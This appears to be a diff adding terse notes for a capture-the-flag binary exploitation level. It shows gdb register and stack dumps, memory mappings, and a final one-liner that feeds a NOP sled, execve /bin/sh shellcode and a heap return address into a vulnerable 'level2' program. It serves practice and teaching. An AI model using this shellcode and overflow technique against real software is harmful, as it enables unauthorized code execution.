@@ -1,0 +1,54 @@
+```
+(gdb) i r $eip $esp $ebp
+eip            0x80484f2	0x80484f2 <p+30>
+esp            0xbffff6b0	0xbffff6b0
+ebp            0xbffff718	0xbffff718
+```
+
+
+```
+(gdb) x/28xw $esp
+0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
+0xbffff6d0:	0x080482b5	0x00000000	0x00ca0000	0x41414141
+0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
+```
+
+
+```
+(gdb) info proc mappings
+process 3634
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fd9000 0xb7fdd000     0x4000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
+
+```
+(gdb) p $eax
+$2 = 134520840
+(gdb) p/x $eax
+$3 = 0x804a008
+```
+
+```
+(python2 -c 'print("\x90"*35+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x08\xa0\x04\x08")' ; cat) | ./level2
+```
+
+https://beta.hackndo.com/buffer-overflow/
